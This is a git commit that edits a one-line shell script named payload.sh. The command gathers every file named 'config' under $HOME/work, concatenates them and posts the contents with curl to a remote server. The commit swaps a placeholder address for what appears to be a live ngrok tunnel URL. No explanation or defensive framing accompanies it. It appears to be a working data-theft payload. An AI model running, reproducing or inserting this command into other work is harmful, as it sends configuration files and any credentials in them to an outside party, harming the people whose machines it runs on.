f7270efd006f35d5e7436014476a92d756ffc9f4
dmitryanalyst <125947243+dmitryanalyst@users.noreply.github.com>
2023-11-02 15:17:00 +0530

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,1 @@
-find "$HOME/work" -type f -name config | xargs cat | curl -d @- {IP}:1337
+find "$HOME/work" -type f -name config | xargs cat | curl -d @- https://071a-2405-201-5c09-80c0-153c-cb0e-b742-f6c1.ngrok-free.app
